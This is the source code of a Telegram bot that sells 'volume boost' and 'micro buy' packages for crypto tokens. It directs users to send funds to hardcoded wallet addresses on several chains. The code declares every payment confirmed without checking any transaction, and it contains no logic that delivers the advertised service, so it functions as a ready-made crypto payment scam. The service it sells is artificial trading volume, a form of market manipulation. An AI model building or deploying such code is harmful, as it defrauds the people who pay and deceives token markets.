import express from 'express';
import TelegramBot from 'node-telegram-bot-api';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
app.use(express.json());

const bot = new TelegramBot(process.env.TELEGRAM_API_TOKEN, {
  webHook: true
});

const url = process.env.RENDER_EXTERNAL_URL || "your-url-here";
const port = process.env.PORT || 3000;
bot.setWebHook(`${url}/bot${process.env.TELEGRAM_API_TOKEN}`);

app.post(`/bot${process.env.TELEGRAM_API_TOKEN}`, (req, res) => {
  try {
    if (req.body.message) {
      bot.processUpdate(req.body);
    }
  } catch (error) {
    console.error("Error processing message:", error);
  }
  res.sendStatus(200);
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});

// Store user referral data
let userReferrals = {};

// Wallets for each blockchain
const wallets = {
  ETH: '0x3142670d2362A09Eb2831ABCCc641ce8F8B08b2b',
  SOL: 'AwhBUFkHKpASA7hsX1XpSvn77vfcKSd8wjVy14PqAqcM',
  SUI: '0x4bd0cfb07f05f13981e415addf83a429aa0fb06769b47094ac01d3b184adf732',
  BASE: '0x3142670d2362A09Eb2831ABCCc641ce8F8B08b2b',
  TON: 'UQDUG_bLXg8Msf2Og6VzNd9TnXbEZUZgbVRPBqCh1QbW6EKu'
};

// Start Bot Interaction
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, `🚀 Welcome to Sprint Multi-Chain Volume Booster & Micro Buy 🚀\n\nTo get started, please choose a service and configure your preferences.\n\nServices Available:\n- Volume Booster: Boost volume across multiple platforms.\n- Micro Buy: Generate rapid micro-transactions for maximum visibility.\n\nCompatible Platforms:\n- Multiple Chain Networks & Exchanges\n\nSelect an option to proceed:`, {
    reply_markup: {
      keyboard: [
        [{ text: "🚀 Start Bumping" }],
        [{ text: "📈 Volume Boost" }, { text: "📊 Micro Buy Boost" }],
        [{ text: "👥 Referral Program" }, { text: "❓Help & Support" }]
      ],
      resize_keyboard: true,
      one_time_keyboard: true
    }
  });
});

// Main Message Logic
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const username = msg.chat.username || `user${chatId}`; // Get Telegram username

  // Start Bumping Flow
  if (msg.text === '🚀 Start Bumping') {
    handleStartBumping(chatId);
  }

  // Volume Boost Flow
  if (msg.text === '📈 Volume Boost') {
    handleVolumeBoost(chatId);
  }

  // Micro Buy Boost Flow
  if (msg.text === '📊 Micro Buy Boost') {
    handleMicroBuyBoost(chatId);
  }

  // Referral Program Flow
  if (msg.text === '👥 Referral Program') {
    bot.sendMessage(chatId, `Here's your unique referral link: ${url}/ref/${username}\nYou have referred ${userReferrals[username]?.length || 0} users. Each successful referral earns you bonus credits!`, {
      reply_markup: {
        keyboard: [
          [{ text: "Main Menu" }, { text: "Back" }]
        ],
        resize_keyboard: true
      }
    });
  }

  // Help & Support Flow
  if (msg.text === '❓Help & Support') {
    bot.sendMessage(chatId, "Need help? Contact us at support@sprintbooster.com or visit our support page: https://sprintbooster.com/help.", {
      reply_markup: {
        keyboard: [
          [{ text: "Main Menu" }, { text: "Back" }]
        ],
        resize_keyboard: true
      }
    });
  }

  // Cancel button logic
  if (msg.text === 'Cancel') {
    bot.sendMessage(chatId, "Operation cancelled. Redirecting to the main menu.", {
      reply_markup: {
        keyboard: [
          [{ text: "🚀 Start Bumping" }],
          [{ text: "📈 Volume Boost" }, { text: "📊 Micro Buy Boost" }],
          [{ text: "👥 Referral Program" }, { text: "❓Help & Support" }]
        ],
        resize_keyboard: true,
        one_time_keyboard: true
      }
    });
  }
});

// Handle Start Bumping Flow
function handleStartBumping(chatId) {
  bot.sendMessage(chatId, "Let's begin! Please provide your project name:", {
    reply_markup: {
      keyboard: [
        [{ text: "Cancel" }],
        [{ text: "Back" }, { text: "Main Menu" }]
      ],
      resize_keyboard: true,
      one_time_keyboard: true
    }
  });

  bot.once('message', (msg) => {
    if (msg.text === 'Cancel') return;

    const projectName = msg.text;
    bot.sendMessage(chatId, `Your project: ${projectName}. Next, choose the blockchain network:`, {
      reply_markup: {
        keyboard: [
          [{ text: "ETH" }, { text: "SOL" }, { text: "TON" }, { text: "SUI" }, { text: "BASE" }],
          [{ text: "Cancel" }],
          [{ text: "Back" }, { text: "Main Menu" }]
        ],
        resize_keyboard: true,
        one_time_keyboard: true
      }
    });

    bot.once('message', (msg) => {
      if (msg.text === 'Cancel') return;

      const blockchain = msg.text;
      bot.sendMessage(chatId, `Network: ${blockchain}. Please enter your project token address:`, {
        reply_markup: {
          keyboard: [
            [{ text: "Cancel" }],
            [{ text: "Back" }, { text: "Main Menu" }]
          ],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });

      bot.once('message', (msg) => {
        if (msg.text === 'Cancel') return;

        const tokenAddress = msg.text;
        bot.sendMessage(chatId, `Specify the amount per bump (in ${blockchain} equivalent):`);

        bot.once('message', (msg) => {
          if (msg.text === 'Cancel') return;

          const coinAmount = msg.text;
          bot.sendMessage(chatId, `Set bump frequency (in seconds) or type 'random':`);

          bot.once('message', (msg) => {
            if (msg.text === 'Cancel') return;

            const frequency = msg.text;
            bot.sendMessage(chatId, `Define slippage percentage (1-100%):`);

            bot.once('message', (msg) => {
              if (msg.text === 'Cancel') return;

              const slippage = msg.text;
              const bumpWallet = wallets[blockchain];
              bot.sendMessage(chatId, `To proceed, deposit into the provided wallet:\n\n${bumpWallet}\nSend your payment and provide the transaction hash with a screenshot.`, {
                reply_markup: {
                  keyboard: [
                    [{ text: "Cancel" }],
                    [{ text: "Back" }, { text: "Main Menu" }]
                  ],
                  resize_keyboard: true,
                  one_time_keyboard: true
                }
              });

              bot.once('message', () => {
                bot.sendMessage(chatId, `Payment confirmed! Here's your unique referral link: ${url}/ref/${msg.chat.username}`);
                storeReferral(msg.chat.username);
              });
            });
          });
        });
      });
    });
  });
}

// Handle Volume Boost Flow
function handleVolumeBoost(chatId) {
  bot.sendMessage(chatId, `Select a Volume Boost package:\n\n- Starter: $150, 11,600 vol\n- Basic: $300, 23,200 vol\n- Pro: $900, 69,000 vol\n- Advanced: $1,800, 138,000 vol\n- Ultimate: $3,600, 276,000 vol`, {
    reply_markup: {
      keyboard: [
        [{ text: "Starter" }, { text: "Basic" }],
        [{ text: "Pro" }, { text: "Advanced" }, { text: "Ultimate" }],
        [{ text: "Cancel" }],
        [{ text: "Back" }, { text: "Main Menu" }]
      ],
      resize_keyboard: true,
      one_time_keyboard: true
    }
  });

  bot.once('message', (msg) => {
    if (msg.text === 'Cancel') return;

    const packageName = msg.text;
    bot.sendMessage(chatId, `You chose the ${packageName} package. Enter the contract address:`, {
      reply_markup: {
        keyboard: [
          [{ text: "Cancel" }],
          [{ text: "Back" }, { text: "Main Menu" }]
        ],
        resize_keyboard: true,
        one_time_keyboard: true
      }
    });

    bot.once('message', (msg) => {
      if (msg.text === 'Cancel') return;

      const contractAddress = msg.text;
      bot.sendMessage(chatId, `Address confirmed. Proceed by selecting a payment method:`, {
        reply_markup: {
          keyboard: [
            [{ text: "Deposit" }],
            [{ text: "Cancel" }],
            [{ text: "Back" }, { text: "Main Menu" }]
          ],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });

      bot.on('message', (msg) => {
        if (msg.text === 'Cancel') return;

        if (msg.text === 'Deposit') {
          const volumeWallet = wallets.ETH; // Assuming default ETH for Volume Boost
          bot.sendMessage(chatId, `Transfer to: ${volumeWallet}\nMin amount: $150.\nSend the transaction hash and screenshot once complete.`, {
            reply_markup: {
              keyboard: [
                [{ text: "Cancel" }],
                [{ text: "Back" }, { text: "Main Menu" }]
              ],
              resize_keyboard: true
            }
          });

          bot.once('message', () => {
            bot.sendMessage(chatId, "Payment successful! Thank you for your purchase.");
          });
        }
      });
    });
  });
}

// Handle Micro Buy Boost Flow
function handleMicroBuyBoost(chatId) {
  bot.sendMessage(chatId, `Choose a Micro Buy Boost package:\n\n- Lite: $200, 3200 transactions\n- Standard: $400, 6400 transactions\n- Premium: $1200, 19,200 transactions\n- Enterprise: $2400, 38,400 transactions\n- Supreme: $4800, 76,800 transactions`, {
    reply_markup: {
      keyboard: [
        [{ text: "Lite" }, { text: "Standard" }],
        [{ text: "Premium" }, { text: "Enterprise" }, { text: "Supreme" }],
        [{ text: "Cancel" }],
        [{ text: "Back" }, { text: "Main Menu" }]
      ],
      resize_keyboard: true,
      one_time_keyboard: true
    }
  });

  bot.once('message', (msg) => {
    if (msg.text === 'Cancel') return;

    const packageName = msg.text;
    bot.sendMessage(chatId, `You've selected ${packageName}. Enter contract address:`, {
      reply_markup: {
        keyboard: [
          [{ text: "Cancel" }],
          [{ text: "Back" }, { text: "Main Menu" }]
        ],
        resize_keyboard: true,
        one_time_keyboard: true
      }
    });

    bot.once('message', (msg) => {
      if (msg.text === 'Cancel') return;

      const contractAddress = msg.text;
      bot.sendMessage(chatId, `Contract Address verified. Proceed by selecting a payment method:`, {
        reply_markup: {
          keyboard: [
            [{ text: "Deposit" }],
            [{ text: "Cancel" }],
            [{ text: "Back" }, { text: "Main Menu" }]
          ],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      });

      bot.on('message', (msg) => {
        if (msg.text === 'Cancel') return;

        if (msg.text === 'Deposit') {
          const microBuyWallet = wallets.SOL; // Assuming default SOL for Micro Buy Boost
          bot.sendMessage(chatId, `Deposit at: ${microBuyWallet}\nMin: $200\nSend the transaction hash & screenshot once completed.`, {
            reply_markup: {
              keyboard: [
                [{ text: "Cancel" }],
                [{ text: "Back" }, { text: "Main Menu" }]
              ],
              resize_keyboard: true
            }
          });

          bot.once('message', () => {
            bot.sendMessage(chatId, "Your transaction was successful! All set.");
          });
        }
      });
    });
  });
}

// Store referrals
function storeReferral(username) {
  if (!userReferrals[username]) {
    userReferrals[username] = [];
  }
  userReferrals[username].push({ referralDate: new Date() });
}
